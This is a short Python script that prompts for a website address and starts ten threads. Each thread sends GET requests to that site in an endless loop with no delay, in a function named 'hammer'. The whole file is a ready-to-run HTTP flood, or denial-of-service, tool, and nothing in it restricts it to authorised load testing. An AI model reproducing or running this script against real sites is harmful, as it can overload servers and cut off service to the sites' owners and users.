import requests
import time
import threading

URL = "http://" + input("type web url \nexample: example.com \n")
THREADS = 10
DELAY = 0

def hammer():
    while True:
        try:
            response = requests.get(URL)
            print(f"[{response.status_code}]")
        except Exception as e:
            print(f"[!] Error: {e}")
        time.sleep(DELAY)

def main():
    for _ in range(THREADS):
        t = threading.Thread(target=hammer)
        t.daemon = True
        t.start()
    input("Press Enter to stop...\n")

if __name__ == "__main__":
    main()